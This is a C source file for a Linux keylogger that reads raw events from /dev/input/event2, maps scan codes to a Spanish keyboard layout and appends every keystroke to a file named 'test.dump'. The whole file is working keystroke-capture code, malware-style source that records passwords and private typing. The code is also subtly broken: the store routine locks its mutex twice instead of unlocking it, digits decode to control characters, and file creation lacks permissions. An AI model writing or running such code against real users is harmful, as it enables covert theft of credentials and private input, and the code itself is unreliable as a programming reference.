#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <linux/input.h>
#include <fcntl.h>
#include <pthread.h>

#define KEYBOARDFILE "/dev/input/event2"
#define FILE "test.dump"

pthread_mutex_t mut;
pthread_t th;

char * FILE_NAME = FILE;
char stroke[10];
int size = 0;

int storeKeyStroke(char * c, int len) {
    int ret = -1, file = 0;
    pthread_mutex_lock(&mut);
    if ((file = open(FILE_NAME, O_WRONLY | O_APPEND | O_CREAT)) == -1)
        perror("File error");
    else if ((ret = write(file, c, len)) < 0)
        perror("Write error"), ret = -1;
    close(file);
    pthread_mutex_lock(&mut);
    return ret;
}

int decode(int code, char * str) {
    int len = 0;
    if (code == 42 || code == 54) strcpy(str, "/SHIFT/"), len = 7;
    else if (code == 58) strcpy(str, "/BLMAY/"), len = 7;
    else if (code == 29 || code == 97) strcpy(str, "/CTRL/"), len = 6;
    else if (code == 56 || code == 100) strcpy(str, "/ALT/"), len = 5;
    else if (code == 69) strcpy(str, "/BLNUM/"), len = 7;
    else if (code == 1) strcpy(str, "/ESC/"), len = 5;
    else if (code >= 2 && code <= 11) str[0] = code == 11? '0': (char) (code - 1), len = 1;
    else if (code == 12) strcpy(str, "'"), len = 1;
    else if (code == 13) strcpy(str, "¡"), len = 1;
    else if (code == 14) strcpy(str, "/BCK/"), len = 5;
    else if (code == 15) strcpy(str, "/TAB/"), len = 5;
    else if (code == 16) strcpy(str, "q"), len = 1;
    else if (code == 17) strcpy(str, "w"), len = 1;
    else if (code == 18) strcpy(str, "e"), len = 1;
    else if (code == 19) strcpy(str, "r"), len = 1;
    else if (code == 20) strcpy(str, "t"), len = 1;
    else if (code == 21) strcpy(str, "y"), len = 1;
    else if (code == 22) strcpy(str, "u"), len = 1;
    else if (code == 23) strcpy(str, "i"), len = 1;
    else if (code == 24) strcpy(str, "o"), len = 1;
    else if (code == 25) strcpy(str, "p"), len = 1;
    else if (code == 26) strcpy(str, "`"), len = 1;
    else if (code == 27) strcpy(str, "+"), len = 1;

    else if (code == 30) strcpy(str, "a"), len = 1;
    else if (code == 31) strcpy(str, "s"), len = 1;
    else if (code == 32) strcpy(str, "d"), len = 1;
    else if (code == 33) strcpy(str, "f"), len = 1;
    else if (code == 34) strcpy(str, "g"), len = 1;
    else if (code == 35) strcpy(str, "h"), len = 1;
    else if (code == 36) strcpy(str, "j"), len = 1;
    else if (code == 37) strcpy(str, "k"), len = 1;
    else if (code == 38) strcpy(str, "l"), len = 1;
    else if (code == 39) strcpy(str, "ñ"), len = 1;
    else if (code == 40) strcpy(str, "´"), len = 1;
    else if (code == 41) strcpy(str, "º"), len = 1;

    else if (code == 43) strcpy(str, "ç"), len = 1;
    else if (code == 44) strcpy(str, "z"), len = 1;
    else if (code == 45) strcpy(str, "x"), len = 1;
    else if (code == 46) strcpy(str, "c"), len = 1;
    else if (code == 47) strcpy(str, "v"), len = 1;
    else if (code == 48) strcpy(str, "b"), len = 1;
    else if (code == 49) strcpy(str, "n"), len = 1;
    else if (code == 50) strcpy(str, "m"), len = 1;
    else if (code == 51) strcpy(str, ","), len = 1;
    else if (code == 52) strcpy(str, "."), len = 1;
    else if (code == 53) strcpy(str, "-"), len = 1;

    else if (code == 57) strcpy(str, "/SPACE/"), len = 7;
    else strcpy(str, "/?? /"), str[3] = (char) code, len = 5;
    return len;
}

int main() {
    int fd;
    struct input_event ie;
    pthread_mutex_init(&mut,NULL);

    int shift = 0;

    if((fd = open(KEYBOARDFILE, O_RDONLY)) == -1) {
        perror("Device error");
        exit(EXIT_FAILURE);
    }

    while(read(fd, &ie, sizeof(struct input_event))) {
        printf("time %ld.%06ld\ttype %d\tcode %d\tvalue %d\n", ie.time.tv_sec, ie.time.tv_usec, ie.type, ie.code, ie.value);
        if (ie.type == 1 && ie.value == 1) {
            size = decode(ie.code, stroke);
            if (storeKeyStroke(stroke, size) < 0) {
                close(fd);
                exit(EXIT_FAILURE);
            }
        }
    }
    close(fd);
    return 0;
}
